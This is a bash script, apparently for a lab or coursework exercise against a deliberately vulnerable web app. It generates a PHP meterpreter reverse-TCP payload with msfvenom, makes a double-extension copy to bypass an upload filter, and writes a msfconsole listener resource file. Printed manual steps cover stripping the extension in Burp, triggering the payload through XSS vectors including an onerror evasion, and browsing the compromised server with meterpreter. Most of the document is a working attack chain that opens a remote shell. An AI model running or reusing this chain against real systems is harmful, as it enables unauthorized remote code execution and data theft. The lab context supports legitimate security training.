#!/usr/bin/env bash
# Phase 3 — Build the PHP meterpreter payload + msfconsole listener resource.
# Grounded in: ksanchezcld Hacking_Cheat_Sheet (Metasploit/msfconsole notes).
# The GUI steps (Burp upload bypass, XSS trigger, meterpreter navigation) are
# interactive and are printed below for you to do by hand + screenshot.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=config.sh
source "$HERE/config.sh"
# shellcheck source=lib/common.sh
source "$HERE/lib/common.sh"

c_blue "=== Phase 3: msfvenom payload + handler.rc ==="

# 1) Generate the PHP reverse-TCP meterpreter payload.
run_and_capture "p3_payload" "Generate php/meterpreter/reverse_tcp payload" -- \
  msfvenom -p php/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw -o "$HERE/payload.php"

# 2) Make it executable PHP: strip msfvenom's leading comment so it starts with <?php
sed -i '1s|^/\*||' "$HERE/payload.php"
grep -q '^<?php' "$HERE/payload.php" || sed -i '1s|^|<?php |' "$HERE/payload.php"

# 3) Second copy with a double extension for the upload-filter bypass.
cp "$HERE/payload.php" "$HERE/payload.php.jpeg"
c_green "[+] payload.php and payload.php.jpeg are ready in $HERE"

# 4) Write the msfconsole resource file for the multi/handler listener.
cat > "$HERE/handler.rc" <<EOF
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
c_green "[+] handler.rc written. Start the listener with:  msfconsole -r handler.rc"

cat <<'EOT'

------------------------------------------------------------------
MANUAL (GUI) STEPS — the script cannot do these; screenshot each:
  1. Tool 3: upload payload.php.jpeg. Intercept in Burp, delete the
     ".jpeg" from the filename in the request, Forward. Note the
     stored upload path in the response.
  2. In a terminal:  msfconsole -r handler.rc
  3. Tool 2 (XSS): trigger the payload, e.g.
       <script>window.location="http://<IP>/wilburcompany/hackable/uploads/payload.php"</script>
     If <script> is filtered, use an evasion vector such as
       <img src=x onerror="window.location='http://<IP>/.../uploads/payload.php'">
  4. When you get "meterpreter >":
       pwd                              -> Q1 (working directory)
       cd users ; ls                    -> Q2 (count + usernames)
       cd ../wilburcompanyBAK ; ls
       cat README.txt                   -> Q3a-c (contents / framework / Contact)
------------------------------------------------------------------
EOT
